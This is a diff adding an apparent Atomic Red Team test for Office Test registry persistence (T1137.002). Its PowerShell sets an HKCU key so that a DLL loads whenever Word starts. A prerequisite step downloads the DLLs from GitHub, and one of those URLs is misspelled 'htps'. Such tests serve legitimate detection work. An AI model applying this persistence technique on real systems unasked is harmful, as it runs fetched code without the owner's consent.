@@ -1,0 +1,33 @@
+{
+  "attack_technique": "T1137.002",
+  "display_name": "Office Application Startup: Office Test",
+  "atomic_tests": [
+    {
+      "name": "Office Application Startup Test Persistence (HKCU)",
+      "description": "Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office\napplication is started. Key is used for debugging purposes. Not created by default & exist in HKCU & HKLM hives.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\" /f       \n}\nelse{\n  Write-Host \"32-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\" /f\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\"",
+        "cleanup_command": "Stop-Process -Name \"notepad\",\"WinWord\" -ErrorAction Ignore\nRemove-Item \"HKCU:\\Software\\Microsoft\\Office test\\Special\\Perf\" -ErrorAction Ignore"
+      },
+      "input_arguments": {},
+      "dependencies": [
+        {
+          "description": "Microsoft Word must be installed",
+          "prereq_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }",
+          "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\""
+        },
+        {
+          "description": "DLL files must exist on disk at specified location",
+          "prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\")) {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.002\\bin\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.002/bin/officetest_x64.dll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\"\nInvoke-Webrequest -Uri \"htps://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.002/bin/officetest_x86.dll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\""
+        }
+      ],
+      "auto_generated_guid": "c3e35b58-fe1c-480b-b540-7600fb612563"
+    }
+  ]
+}
